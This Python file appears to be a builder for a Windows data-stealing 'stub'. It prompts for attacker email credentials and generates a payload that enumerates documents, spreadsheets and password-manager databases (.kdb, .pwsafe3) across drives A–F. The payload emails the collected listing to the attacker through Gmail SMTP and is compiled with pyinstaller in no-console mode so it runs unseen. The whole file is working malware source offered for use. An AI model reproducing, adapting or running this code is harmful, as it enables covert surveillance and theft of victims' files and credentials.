from lib2to3.pytree import convert
from mimetypes import init
import os
from colorama import Fore
from colorama import init
init()
print(Fore.RED + """
  $$$$$$ /$$ /$$           /$$      /$$                     /$$                    
| $$_____/|__/| $$          | $$$    /$$$                    |__/                    
| $$       /$$| $$  /$$$$$$ | $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$ /$$$$$$$   /$$$$$$ 
| $$$$$   | $$| $$ /$$__  $$| $$ $$/$$ $$ |____  $$ /$$__  $$| $$| $$__  $$ /$$__  $$
| $$__/   | $$| $$| $$$$$$$$| $$  $$$| $$  /$$$$$$$| $$  \__/| $$| $$  \ $$| $$$$$$$$
| $$      | $$| $$| $$_____/| $$\  $ | $$ /$$__  $$| $$      | $$| $$  | $$| $$_____/
| $$      | $$| $$|  $$$$$$$| $$ \/  | $$|  $$$$$$$| $$      | $$| $$  | $$|  $$$$$$$
|__/      |__/|__/ \_______/|__/     |__/ \_______/|__/      |__/|__/  |__/ \_______/

Coded By Aleksey.



""")
botmail = input("Enter sender email: ")
password = input("Enter the password: ")
receiver = input("On what email you wish to receive results: ")
stubname = input("Stub output name: ")
code = """
from cmath import rect
from email import message
import os
from pydoc import plain
import requests
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
cmd = ('dir /S C:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log3.txt & dir /S A:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log1.txt & dir /S B:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log2.txt & dir /S D:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log4.txt & dir /S E:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log5.txt & dir /S F:\*.txt *.docx *.dot *.docm *.doc *.xls *.xlsx *.kdb *.pwsafe3>log6.txt ')
os.system(cmd)
os.system("copy log1.txt + log2.txt + log3.txt + log4.txt + log5.txt + log6.txt log.txt")
botmail ='""", botmail,  """'
receiver ='""", receiver,  """'
password ='""", password,  """'
subject = "Logs"
body = "Here are all the logs. Coded by Aleksey."
message = MIMEMultipart()
message.attach(MIMEText(body, "plain"))
filename = "log.txt"
with open(filename, "rb") as attachment:
    part = MIMEBase("Application", "octet-stream")
    part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)
message.attach(part)
text = message.as_string()
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(botmail, password)
    server.sendmail(botmail, receiver, text)"""
finalstubname = stubname + ".py"
stub = open(finalstubname, "w+")
stub.writelines(code)
stub.close()
os.system("pip install pyinstaller")
os.system("pyinstaller --onefile --noconsole {}".format(finalstubname))
print("Stub is located in dist folder..")
input("Press Enter To exit....")



